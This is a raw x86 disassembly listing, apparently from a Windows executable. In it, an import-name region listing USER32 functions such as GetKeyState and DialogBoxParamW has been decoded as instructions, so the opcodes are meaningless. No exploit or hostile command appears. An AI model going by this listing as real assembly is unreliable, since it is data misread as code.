  4132c8:	jb     0x41332f
  4132ca:	je     0x4132cc
  4132cc:	mov    dl,0x0
  4132ce:	inc    esp
  4132cf:	jb     0x413332
  4132d1:	ja     0x413319
  4132d3:	jb     0x413336
  4132d5:	ins    DWORD PTR es:[edi],dx
  4132d6:	gs inc ebx
  4132d8:	outs   dx,DWORD PTR ds:[esi]
  4132d9:	outs   dx,BYTE PTR ds:[esi]
  4132da:	je     0x41334e
  4132dc:	outs   dx,DWORD PTR ds:[esi]
  4132dd:	ins    BYTE PTR es:[edi],dx
  4132de:	add    BYTE PTR [eax],al
  4132e0:	inc    esi
  4132e1:	add    BYTE PTR [ebx+0x6c],al
  4132e4:	outs   dx,DWORD PTR ds:[esi]
  4132e5:	jae    0x41334c
  4132e7:	inc    esp
  4132e8:	gs jae 0x413356
  4132eb:	je     0x41335c
  4132ed:	jo     0x4132ef
  4132ef:	add    BYTE PTR [ebp+0x61694400],bl
  4132f5:	ins    BYTE PTR es:[edi],dx
  4132f6:	outs   dx,DWORD PTR ds:[esi]
  4132f7:	addr16 inc edx
  4132f9:	outs   dx,DWORD PTR ds:[esi]
  4132fa:	js     0x41334c
  4132fc:	popa   
  4132fd:	jb     0x413360
  4132ff:	ins    DWORD PTR es:[edi],dx
  413300:	push   edi
  413301:	add    BYTE PTR [edx],cl
  413303:	add    BYTE PTR [ecx+0x72],al
  413306:	jb     0x413369
  413308:	outs   dx,BYTE PTR ds:[esi]
  413309:	addr16 gs dec ecx
  41330c:	arpl   WORD PTR [edi+0x6e],bp
  41330f:	imul   esp,DWORD PTR [ebx+0x57],0x6f646e69
  413316:	ja     0x41338b
  413318:	add    BYTE PTR [eax],al
  41331a:	fld    QWORD PTR [eax]
  41331c:	inc    ebp
  41331d:	jno    0x413394
  41331f:	popa   
  413320:	ins    BYTE PTR es:[edi],dx
  413321:	push   edx
  413322:	arpl   WORD PTR gs:[eax+eax*1-0x45],si
  413327:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41332b:	fs push ebx
  41332d:	je     0x4133a1
  41332f:	imul   ebp,DWORD PTR [esi+0x67],0x1ee0041
  413336:	push   eax
  413337:	gs imul ecx,DWORD PTR gs:[ebp+0x65],0x73
  41333d:	jae    0x4133a0
  41333f:	addr16 gs inc ecx
  413342:	add    BYTE PTR [eax],al
  413344:	cmp    DWORD PTR [eax],eax
  413346:	inc    ebx
  413347:	push   0x70557261
  41334c:	jo     0x4133b3
  41334e:	jb     0x4133a7
  413350:	add    BYTE PTR [eax],al
  413352:	adc    eax,DWORD PTR [ecx]
  413354:	inc    edi
  413355:	gs je  0x41339c
  413358:	outs   dx,DWORD PTR ds:[esi]
  413359:	jne    0x4133bd
  41335b:	ins    BYTE PTR es:[edi],dx
  41335c:	gs inc ebx
  41335e:	ins    BYTE PTR es:[edi],dx
  41335f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  413366:	add    BYTE PTR [eax],al
  413368:	mov    ds:0x57734901,eax
  41336d:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  413374:	jae    0x4133df
  413376:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41337a:	mov    esp,0x61724400
  41337f:	ja     0x4133d5
  413381:	gs js  0x4133f8
  413384:	push   edi
  413385:	add    BYTE PTR [ebp+0x61724400],dh
  41338b:	ja     0x4133da
  41338d:	outs   dx,BYTE PTR gs:[esi]
  41338f:	jne    0x4133d3
  413391:	popa   
  413392:	jb     0x413394
  413394:	jle    0x413397
  413396:	dec    eax
  413397:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  41339f:	jne    0x4133ea
  4133a1:	je     0x413408
  4133a3:	ins    DWORD PTR es:[edi],dx
  4133a4:	add    BYTE PTR [eax],al
  4133a6:	mov    al,BYTE PTR [edx]
  4133a8:	push   esp
  4133a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  4133b1:	ja     0x413426
  4133b3:	add    BYTE PTR [eax],ch
  4133b5:	add    BYTE PTR [ebx+0x68],al
  4133b8:	popa   
  4133b9:	jb     0x413407
  4133bb:	outs   dx,DWORD PTR ds:[esi]
  4133bc:	ja     0x413423
  4133be:	jb     0x413402
  4133c0:	jne    0x413428
  4133c2:	push   di
  4133c4:	add    BYTE PTR [eax],al
  4133c6:	bound  eax,QWORD PTR [eax]
  4133c8:	inc    ebx
  4133c9:	jb     0x413430
  4133cb:	popa   
  4133cc:	je     0x413433
  4133ce:	push   edi
  4133cf:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4133d6:	inc    ecx
  4133d7:	add    BYTE PTR [ebx+0x2],dh
  4133da:	push   ebx
  4133db:	gs je  0x413435
  4133de:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4133e5:	js     0x41345b
  4133e7:	inc    ecx
  4133e8:	add    BYTE PTR [eax],al
  4133ea:	pop    ecx
  4133eb:	add    dl,BYTE PTR [ebx+0x65]
  4133ee:	je     0x413442
  4133f0:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4133f5:	jo     0x41346b
  4133f7:	jns    0x4133f9
  4133f9:	add    bh,ah
  4133fb:	add    BYTE PTR [esi+0x72],al
  4133fe:	popa   
  4133ff:	ins    DWORD PTR es:[edi],dx
  413400:	gs push edx
  413402:	arpl   WORD PTR gs:[eax+eax*1+0x3b],si
  413407:	add    DWORD PTR [edi+0x65],eax
  41340a:	je     0x413459
  41340c:	gs jae 0x413482
  41340f:	popa   
  413410:	addr16 gs inc ebp
  413413:	js     0x413489
  413415:	jb     0x413478
  413417:	dec    ecx
  413418:	outs   dx,BYTE PTR ds:[esi]
  413419:	outs   dx,WORD PTR ds:[esi]
  41341b:	add    BYTE PTR [eax+0x2],ch
  41341e:	push   ebx
  41341f:	gs je  0x413477
  413422:	jae    0x413489
  413424:	jb     0x413475
  413426:	bound  ebp,QWORD PTR [edx+0x65]
  413429:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41342d:	outs   dx,WORD PTR ds:[esi]
  41342f:	jb     0x41349e
  413431:	popa   
  413432:	je     0x41349d
  413434:	outs   dx,DWORD PTR ds:[esi]
  413435:	outs   dx,BYTE PTR ds:[esi]
  413436:	push   edi
  413437:	add    BYTE PTR [ebx+0x73654400],dl
  41343d:	je     0x4134b1
  41343f:	outs   dx,DWORD PTR ds:[esi]
  413440:	jns    0x413483
  413442:	arpl   WORD PTR [ebx+0x65],sp
  413445:	ins    BYTE PTR es:[edi],dx
  413446:	gs jb  0x4134aa
  413449:	je     0x4134ba
  41344b:	jb     0x4134a1
  41344d:	popa   
  41344e:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413452:	xor    al,BYTE PTR [ecx]
  413454:	inc    edi
  413455:	gs je  0x4134a5
  413458:	outs   dx,BYTE PTR gs:[esi]
  41345a:	jne    0x4134a5
  41345c:	je     0x4134c3
  41345e:	ins    DWORD PTR es:[edi],dx
  41345f:	inc    ebx
  413460:	outs   dx,DWORD PTR ds:[esi]
  413461:	jne    0x4134d1
  413463:	je     0x413465
  413465:	add    BYTE PTR [ebp+0x79656b02],bh
  41346b:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41346f:	jbe    0x4134d6
  413471:	outs   dx,BYTE PTR ds:[esi]
  413472:	je     0x413474
  413474:	call   0x65b1837a
  413479:	outs   dx,BYTE PTR ds:[esi]
  41347a:	dec    ecx
  41347b:	arpl   WORD PTR [edi+0x6e],bp
  41347e:	add    BYTE PTR [eax],al
  413480:	das    
  413481:	add    dl,BYTE PTR [ebx+0x65]
  413484:	je     0x4134c7
  413486:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41348a:	gs push edi
  41348c:	imul   ebp,DWORD PTR [esi+0x64],0x5f00776f
  413493:	add    dl,BYTE PTR [ebx+0x65]
  413496:	je     0x4134eb
  413498:	jns    0x41350d
  41349a:	inc    ebx
  41349b:	outs   dx,DWORD PTR ds:[esi]
  41349c:	ins    BYTE PTR es:[edi],dx
  41349d:	outs   dx,DWORD PTR ds:[esi]
  41349e:	jb     0x413513
  4134a0:	add    BYTE PTR [eax],al
  4134a2:	mov    dh,0x1
  4134a4:	dec    esp
  4134a5:	outs   dx,DWORD PTR ds:[esi]
  4134a6:	popa   
  4134a7:	fs dec ebp
  4134a9:	outs   dx,BYTE PTR gs:[esi]
  4134ab:	jne    0x4134ee
  4134ad:	add    BYTE PTR ds:0x61684300,ch
  4134b3:	jb     0x413503
  4134b5:	gs js  0x41352c
  4134b8:	push   edi
  4134b9:	add    dh,cl
  4134bb:	add    DWORD PTR [ebp+0x65],ecx
  4134be:	jae    0x413533
  4134c0:	popa   
  4134c1:	addr16 gs inc edx
  4134c4:	outs   dx,DWORD PTR ds:[esi]
  4134c5:	js     0x413508
  4134c7:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  4134ce:	jae    0x41353c
  4134d0:	popa   
  4134d1:	je     0x413538
  4134d3:	inc    ecx
  4134d4:	arpl   WORD PTR [ebx+0x65],sp
  4134d7:	ins    BYTE PTR es:[edi],dx
  4134d8:	gs jb  0x41353c
  4134db:	je     0x41354c
  4134dd:	jb     0x413536
  4134df:	add    BYTE PTR [ecx+0x66654400],cl
  4134e5:	inc    esi
  4134e6:	jb     0x413549
  4134e8:	ins    DWORD PTR es:[edi],dx
  4134e9:	gs push eax
  4134eb:	jb     0x41355c
  4134ed:	arpl   WORD PTR [ecx+0x0],ax
  4134f0:	test   DWORD PTR [edx],eax
  4134f2:	push   ebx
  4134f3:	jns    0x413568
  4134f5:	je     0x41355c
  4134f7:	ins    DWORD PTR es:[edi],dx
  4134f8:	push   eax
  4134f9:	popa   
  4134fa:	jb     0x41355d
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	gs je  0x413565
  413500:	jb     0x413575
  413502:	dec    ecx
  413503:	outs   dx,BYTE PTR ds:[esi]
  413504:	outs   dx,WORD PTR ds:[esi]
  413506:	inc    ecx
  413507:	add    BYTE PTR ds:0x67655202,al
  41350d:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  413514:	popa   
  413515:	jae    0x41358a
  413517:	push   edi
  413518:	add    BYTE PTR [eax],al
  41351a:	iret   
  41351b:	add    DWORD PTR [ebp+0x65],ecx
  41351e:	jae    0x413593
  413520:	popa   
  413521:	addr16 gs inc edx
  413524:	outs   dx,DWORD PTR ds:[esi]
  413525:	js     0x41356c
  413527:	js     0x41356a
  413529:	add    BYTE PTR [ecx],ch
  41352b:	add    BYTE PTR [ebx+0x68],al
  41352e:	popa   
  41352f:	jb     0x41357d
  413531:	outs   dx,DWORD PTR ds:[esi]
  413532:	ja     0x413599
  413534:	jb     0x41358d
  413536:	add    BYTE PTR [eax],al
  413538:	pushf  
  413539:	add    BYTE PTR [ecx+ebp*2+0x61],al
  41353d:	ins    BYTE PTR es:[edi],dx
  41353e:	outs   dx,DWORD PTR ds:[esi]
  41353f:	addr16 inc edx
  413541:	outs   dx,DWORD PTR ds:[esi]
  413542:	js     0x413594
  413544:	popa   
  413545:	jb     0x4135a8
  413547:	ins    DWORD PTR es:[edi],dx
  413548:	inc    ecx
  413549:	add    BYTE PTR [esi],bh
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x41359d
  413550:	gs jae 0x4135c6
  413553:	popa   
  413554:	addr16 gs push edi
  413557:	add    BYTE PTR [edi+0x2],dl
  41355a:	push   ebx
  41355b:	gs je  0x4135ae
  41355e:	jb     0x4135cf
  413560:	jo     0x4135b9
  413562:	add    BYTE PTR [eax],al
  413564:	loope  0x413566
  413566:	inc    esi
  413567:	imul   ebp,DWORD PTR [esi+0x64],0x646e6957
  41356e:	outs   dx,DWORD PTR ds:[esi]
  41356f:	ja     0x4135b2
  413571:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  413578:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x6f43004a
  413580:	jo     0x4135fb
  413582:	inc    ecx
  413583:	arpl   WORD PTR [ebx+0x65],sp
  413586:	ins    BYTE PTR es:[edi],dx
  413587:	gs jb  0x4135eb
  41358a:	je     0x4135fb
  41358c:	jb     0x4135e2
  41358e:	popa   
  41358f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  413593:	add    cl,al
  413595:	add    BYTE PTR [ebp+0x6e],al
  413598:	popa   
  413599:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41359d:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  4135a4:	pop    edx
  4135a5:	add    dl,BYTE PTR [ebx+0x65]
  4135a8:	je     0x4135fd
  4135aa:	arpl   WORD PTR [edx+0x6f],si
  4135ad:	ins    BYTE PTR es:[edi],dx
  4135ae:	ins    BYTE PTR es:[edi],dx
  4135af:	dec    ecx
  4135b0:	outs   dx,BYTE PTR ds:[esi]
  4135b1:	outs   dx,WORD PTR ds:[esi]
  4135b3:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4135ba:	push   ebx
  4135bb:	je     0x41362f
  4135bd:	imul   ebp,DWORD PTR [esi+0x67],0x350057
  4135c4:	inc    ebx
  4135c5:	push   0x6f547261
  4135ca:	dec    edi
  4135cb:	gs ins DWORD PTR es:[edi],dx
  4135cd:	push   edi
  4135ce:	add    BYTE PTR [eax],al
  4135d0:	inc    BYTE PTR [eax]
  4135d2:	inc    edi
  4135d3:	gs je  0x413619
  4135d6:	ins    BYTE PTR es:[edi],dx
  4135d7:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4135de:	jb     0x4135e0
  4135e0:	dec    edx
  4135e1:	add    dl,BYTE PTR [ebx+0x65]
  4135e4:	je     0x413633
  4135e6:	outs   dx,BYTE PTR gs:[esi]
  4135e8:	jne    0x41362e
  4135ea:	gs popaw 
  4135ed:	jne    0x41365b
  4135ef:	je     0x41363a
  4135f1:	je     0x413658
  4135f3:	ins    DWORD PTR es:[edi],dx
  4135f4:	add    BYTE PTR [eax],al
  4135f6:	mov    DWORD PTR [ecx],eax
  4135f8:	dec    ecx
  4135f9:	outs   dx,BYTE PTR ds:[esi]
  4135fa:	jbe    0x41365d
  4135fc:	ins    BYTE PTR es:[edi],dx
  4135fd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  413605:	je     0x413607
  413607:	add    BYTE PTR [ecx+0x616f4c01],ch
  41360d:	fs inc edx
  41360f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x15004170
  413617:	add    DWORD PTR [edi+0x65],eax
  41361a:	je     0x413662
  41361c:	outs   dx,DWORD PTR ds:[esi]
  41361d:	jb     0x413684
  41361f:	addr16 jb 0x413691
  413622:	jne    0x413692
  413624:	fs push edi
  413626:	imul   ebp,DWORD PTR [esi+0x64],0xb800776f
  41362d:	add    BYTE PTR [edx+esi*2+0x61],al
  413631:	ja     0x413686
  413633:	je     0x413696
  413635:	je     0x41369c
  413637:	push   edi
  413638:	add    BYTE PTR [eax],al
  41363a:	xchg   ebx,eax
  41363b:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41363f:	outs   dx,BYTE PTR ds:[esi]
  413640:	jae    0x4136ae
  413642:	popa   
  413643:	je     0x4136aa
  413645:	inc    ecx
  413646:	arpl   WORD PTR [ebx+0x65],sp
  413649:	ins    BYTE PTR es:[edi],dx
  41364a:	gs jb  0x4136ae
  41364d:	je     0x4136be
  41364f:	jb     0x413692
  413651:	add    BYTE PTR [eax+0x57734901],ah
  413657:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41365e:	and    eax,0x6e655302
  413663:	fs dec ecx
  413665:	outs   dx,BYTE PTR ds:[esi]
  413666:	jo     0x4136dd
  413668:	je     0x41366a
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	add    DWORD PTR [ebx+0x69],ecx
  41366e:	ins    BYTE PTR es:[edi],dx
  41366f:	ins    BYTE PTR es:[edi],dx
  413670:	push   esp
  413671:	imul   ebp,DWORD PTR [ebp+0x65],0x1b10072
  413678:	dec    esp
  413679:	outs   dx,DWORD PTR ds:[esi]
  41367a:	popa   
  41367b:	fs dec ecx
  41367d:	ins    DWORD PTR es:[edi],dx
  41367e:	popa   
  41367f:	addr16 gs inc ecx
  413682:	add    BYTE PTR [eax],al
  413684:	daa    
  413685:	add    DWORD PTR [edi+0x65],eax
  413688:	je     0x4136d5
  41368a:	gs jns 0x4136ef
  41368d:	outs   dx,DWORD PTR ds:[esi]
  41368e:	popa   
  41368f:	jb     0x4136f5
  413691:	push   esp
  413692:	jns    0x413704
  413694:	add    BYTE PTR gs:[ebx+0x61724400],dh
  41369b:	ja     0x4136e6
  41369d:	arpl   WORD PTR [edi+0x6e],bp
  4136a0:	add    BYTE PTR [eax],al
  4136a2:	mov    BYTE PTR [edx],al
  4136a4:	push   esp
  4136a5:	popa   
  4136a6:	bound  esp,QWORD PTR [edx+0x65]
  4136a9:	fs push esp
  4136ab:	gs js  0x413722
  4136ae:	dec    edi
  4136af:	jne    0x413725
  4136b1:	push   edi
  4136b2:	add    BYTE PTR [eax],al
  4136b4:	push   0x74654701
  4136b9:	push   edi
  4136ba:	imul   ebp,DWORD PTR [esi+0x64],0x8200776f
  4136c1:	add    DWORD PTR [ecx+0x6e],ecx
  4136c4:	data16 ins BYTE PTR es:[edi],dx
  4136c6:	popa   
  4136c7:	je     0x41372e
  4136c9:	push   edx
  4136ca:	arpl   WORD PTR gs:[eax+eax*1-0x2b],si
  4136cf:	add    DWORD PTR [ebp+0x65],ecx
  4136d2:	jae    0x413747
  4136d4:	popa   
  4136d5:	addr16 gs inc edx
  4136d8:	outs   dx,DWORD PTR ds:[esi]
  4136d9:	js     0x413732
  4136db:	add    BYTE PTR [eax],bh
  4136dd:	add    dl,BYTE PTR [ebx+0x65]
  4136e0:	je     0x413725
  4136e2:	jne    0x413756
  4136e4:	jae    0x413755
  4136e6:	jb     0x4136e8
  4136e8:	mov    es,WORD PTR [edx]
  4136ea:	push   esp
  4136eb:	outs   dx,DWORD PTR ds:[esi]
  4136ec:	push   ebp
  4136ed:	outs   dx,BYTE PTR ds:[esi]
  4136ee:	imul   esp,DWORD PTR [ebx+0x6f],0x78456564
  4136f5:	add    BYTE PTR [esi+0x52734901],bl
  4136fb:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  413700:	jo     0x413776
  413702:	jns    0x413704
  413704:	clc    
  413705:	add    BYTE PTR [edi+0x65],al
  413708:	je     0x41374d
  41370a:	ins    BYTE PTR es:[edi],dx
  41370b:	popa   
  41370c:	jae    0x413781
  41370e:	dec    esp
  41370f:	outs   dx,DWORD PTR ds:[esi]
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	addr16 inc ecx
  413713:	add    BYTE PTR [ecx+0x57734901],ah
  413719:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  413720:	popa   
  413721:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  413725:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41372c:	arpl   WORD PTR [eax+0x54],bp
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	push   esp
  413731:	push   0x69577369
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	outs   dx,DWORD PTR fs:[esi]
  413739:	ja     0x41373b
  41373b:	add    BYTE PTR [ebx],cl
  41373d:	add    DWORD PTR [edi+0x65],eax
  413740:	je     0x413786
  413742:	inc    ebx
  413743:	inc    ebp
  413744:	js     0x413746
  413746:	stos   DWORD PTR es:[edi],eax
  413747:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41374b:	fs inc ebx
  41374d:	jne    0x4137c1
  41374f:	jae    0x4137c0
  413751:	jb     0x413794
  413753:	add    BYTE PTR [edx+0x766e4901],cl
  413759:	popa   
  41375a:	ins    BYTE PTR es:[edi],dx
  41375b:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  413763:	add    BYTE PTR [edx+0x57734901],ah
  413769:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  413770:	imul   esp,DWORD PTR [ebx+0x6f],0xe4006564
  413777:	add    DWORD PTR [edi+0x66],ecx
  41377a:	data16 jae 0x4137e2
  41377d:	je     0x4137d1
  41377f:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413784:	cmp    eax,0x65684300
  413789:	arpl   WORD PTR [ebx+0x52],bp
  41378c:	popa   
  41378d:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413795:	outs   dx,BYTE PTR ds:[esi]
  413796:	add    BYTE PTR [eax],al
  413798:	adc    eax,DWORD PTR [edx]
  41379a:	push   edx
  41379b:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  4137a4:	outs   dx,BYTE PTR ds:[esi]
  4137a5:	outs   dx,DWORD PTR fs:[esi]
  4137a7:	ja     0x4137f6
  4137a9:	gs jae 0x41381f
  4137ac:	popa   
  4137ad:	addr16 gs push edi
  4137b0:	add    BYTE PTR [eax],al
  4137b2:	or     al,BYTE PTR [edx]
  4137b4:	push   edx
  4137b5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  4137be:	je     0x41380b
  4137c0:	gs jns 0x4137c3
  4137c3:	add    BYTE PTR [eax+0x746e4901],cl
  4137c9:	gs jb  0x41383f
  4137cc:	arpl   WORD PTR gs:[edx+edx*2+0x65],si
  4137d1:	arpl   WORD PTR [eax+eax*1-0x17],si
  4137d5:	add    DWORD PTR [edi+0x70],ecx
  4137d8:	outs   dx,BYTE PTR gs:[esi]
  4137da:	dec    ecx
  4137db:	outs   dx,BYTE PTR ds:[esi]
  4137dc:	jo     0x413853
  4137de:	je     0x413824
  4137e0:	gs jae 0x41384e
  4137e3:	je     0x413854
  4137e5:	jo     0x4137e7
  4137e7:	add    BYTE PTR [edx],al
  4137e9:	add    dl,BYTE PTR [edx+0x65]
  4137ec:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  4137f4:	popa   
  4137f5:	jae    0x41386a
  4137f7:	inc    ecx
  4137f8:	add    BYTE PTR [eax],al
  4137fa:	jno    0x4137fe
  4137fc:	push   ebx
  4137fd:	gs je  0x413857
  413800:	imul   ebp,DWORD PTR [esi+0x64],0x6752776f
  413807:	outs   dx,BYTE PTR ds:[esi]
  413808:	add    BYTE PTR [eax],al
  41380a:	mov    ecx,0x616f4c01
  41380f:	fs dec ebp
  413811:	outs   dx,BYTE PTR gs:[esi]
  413813:	jne    0x41386c
  413815:	add    BYTE PTR ds:0x74654701,ch
  41381b:	dec    ebp
  41381c:	outs   dx,BYTE PTR gs:[esi]
  41381e:	jne    0x413863
  413820:	push   0x4d6b6365
  413825:	popa   
  413826:	jb     0x413893
  413828:	inc    esp
  413829:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413830:	outs   dx,BYTE PTR ds:[esi]
  413831:	jae    0x413833
  413833:	add    BYTE PTR [esi+0x66654400],cl
  413839:	push   edi
  41383a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413841:	outs   dx,DWORD PTR ds:[esi]
  413842:	arpl   WORD PTR [ecx+0x0],ax
  413845:	add    BYTE PTR [ebx],al
  413847:	add    BYTE PTR [ecx+0x64],al
  41384a:	push   0x75
  41384c:	jae    0x4138c2
  41384e:	push   edi
  41384f:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413856:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41385a:	add    BYTE PTR [eax],al
  41385c:	add    eax,0x6c6c4100
  413861:	outs   dx,DWORD PTR ds:[esi]
  413862:	ja     0x4138b7
  413864:	gs je  0x4138ad
  413867:	outs   dx,DWORD PTR ds:[esi]
  413868:	jb     0x4138cf
  41386a:	addr16 jb 0x4138dc
  41386d:	jne    0x4138dd
  41386f:	fs push edi
  413871:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413878:	ja     0x41387b
  41387a:	inc    edi
  41387b:	gs je  0x4138d5
  41387e:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  413885:	js     0x4138fb
  413887:	dec    esp
  413888:	outs   dx,BYTE PTR gs:[esi]
  41388a:	addr16 je 0x4138f5
  41388d:	push   edi
  41388e:	add    BYTE PTR [eax],al
  413890:	pushf  
  413891:	add    DWORD PTR [ecx+0x73],ecx
  413894:	dec    ecx
  413895:	arpl   WORD PTR [edi+0x6e],bp
  413898:	imul   esp,DWORD PTR [ebx+0x0],0x53024e00
  41389f:	gs je  0x4138ef
  4138a2:	outs   dx,BYTE PTR gs:[esi]
  4138a4:	jne    0x4138ef
  4138a6:	je     0x41390d
  4138a8:	ins    DWORD PTR es:[edi],dx
  4138a9:	dec    ecx
  4138aa:	outs   dx,BYTE PTR ds:[esi]
  4138ab:	outs   dx,WORD PTR ds:[esi]
  4138ad:	push   edi
  4138ae:	add    BYTE PTR [eax],al
  4138b0:	dec    eax
  4138b1:	add    dl,BYTE PTR [ebx+0x65]
  4138b4:	je     0x413903
  4138b6:	outs   dx,BYTE PTR gs:[esi]
  4138b8:	jne    0x4138ba
  4138ba:	inc    esp
  4138bb:	add    BYTE PTR [ebx+0x6c],al
  4138be:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4138c5:	jb     0x4138c7
  4138c7:	add    cl,al
  4138c9:	add    DWORD PTR [edi+ebp*2+0x6f],ecx
  4138cd:	imul   esi,DWORD PTR [ebp+0x70],0x49
  4138d1:	arpl   WORD PTR [edi+0x6e],bp
  4138d4:	dec    ecx
  4138d5:	fs inc esi
  4138d7:	jb     0x413948
  4138d9:	ins    DWORD PTR es:[edi],dx
  4138da:	inc    esp
  4138db:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4138e2:	jns    0x4138e4
  4138e4:	add    BYTE PTR ss:[ebx+0x68],al
  4138e8:	popa   
  4138e9:	jb     0x413940
  4138eb:	jo     0x41395d
  4138ed:	gs jb  0x413931
  4138f0:	add    BYTE PTR [eax],al
  4138f2:	mov    edi,0x636f4c01
  4138f7:	imul   edx,DWORD PTR [edi+0x69],0x6e
  4138fb:	outs   dx,DWORD PTR fs:[esi]
  4138fd:	ja     0x413954
  4138ff:	jo     0x413965
  413901:	popa   
  413902:	je     0x413969
  413904:	add    BYTE PTR [eax],al
  413906:	cmp    BYTE PTR [ecx],al
  413908:	inc    edi
  413909:	gs je  0x413959
  41390c:	outs   dx,BYTE PTR gs:[esi]
  41390e:	jne    0x413963
  413910:	je     0x413984
  413912:	imul   ebp,DWORD PTR [esi+0x67],0xc9000041
  413919:	add    DWORD PTR [ebp+0x61],ecx
  41391c:	jo     0x413975
  41391e:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413925:	imul   ebp,DWORD PTR [esi+0x74],0x1620073
  41392c:	inc    edi
  41392d:	gs je  0x413984
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	jo     0x41398a
  413933:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41393a:	pop    ecx
  41393b:	add    BYTE PTR [ebx+0x72],al
  41393e:	gs popa 
  413940:	je     0x4139a7
  413942:	inc    esp
  413943:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41394a:	jb     0x4139ad
  41394c:	ins    DWORD PTR es:[edi],dx
  41394d:	push   edi
  41394e:	add    BYTE PTR [eax],al
  413950:	inc    edx
  413951:	add    DWORD PTR [edi+0x65],eax
  413954:	je     0x4139a4
  413956:	gs js  0x4139cd
  413959:	inc    esp
  41395a:	ins    BYTE PTR es:[edi],dx
  41395b:	addr16 inc edi
  41395d:	jb     0x4139ce
  41395f:	jne    0x4139d1
  413961:	dec    ecx
  413962:	je     0x4139c9
  413964:	ins    DWORD PTR es:[edi],dx
  413965:	add    bl,bh
  413967:	add    DWORD PTR [eax+0x74],edx
  41396a:	dec    ecx
  41396b:	outs   dx,BYTE PTR ds:[esi]
  41396c:	push   edx
  41396d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413972:	push   ebp
  413973:	push   ebx
  413974:	inc    ebp
  413975:	push   edx
  413976:	xor    esi,DWORD PTR [edx]
  413978:	cs fs ins BYTE PTR es:[edi],dx
  41397b:	ins    BYTE PTR es:[edi],dx
  41397c:	add    BYTE PTR [eax],al
  41397e:	jns    0x4139c5
  413980:	pop    ecx
  413981:	je     0x4139cb
  413983:	push   ebp
  413984:	jp     0x4139f2
  413986:	jae    0x4139f8
  413988:	push   ecx
  413989:	dec    edx
  41398a:	push   0x47
  41398c:	jne    0x4139d4
  41398e:	fidivr WORD PTR ds:0x3de60041
  413994:	inc    ecx
  413995:	add    dh,dl
  413997:	cmp    eax,DWORD PTR [ecx+0x0]
  41399a:	out    dx,al
  41399b:	or     esi,DWORD PTR [edx+0x3a4f7d0e]
  4139a1:	dec    edi
  4139a2:	ja     0x4139f3
  4139a4:	cmp    DWORD PTR [edi+0x4f],ecx
  4139a7:	dec    edi
  4139a8:	cmp    al,0x4f
  4139aa:	jb     0x4139fb
  4139ac:	xor    ecx,DWORD PTR [edi+0x5e]
  4139af:	dec    edi
  4139b0:	ss dec edi
  4139b2:	jnp    0x413a03
  4139b4:	xor    eax,0x2a4f3a4f
  4139b9:	dec    edi
  4139ba:	push   ds
  4139bb:	push   edx
  4139bc:	pop    ds
  4139bd:	push   ebx
  4139be:	cmp    eax,0x3a4f7d4f
  4139c3:	dec    edi
  4139c4:	ja     0x413a15
  4139c6:	cmp    DWORD PTR [edi+0x4f],ecx
  4139c9:	dec    edi
  4139ca:	cmp    al,0x4f
  4139cc:	jb     0x413a1d
  4139ce:	xor    ecx,DWORD PTR [edi+0x5e]
  4139d1:	dec    edi
  4139d2:	ss dec edi
  4139d4:	ins    DWORD PTR es:[edi],dx
  4139d5:	dec    edi
  4139d6:	xor    eax,0x2a4f3a4f
  4139db:	dec    edi
  4139dc:	push   ds
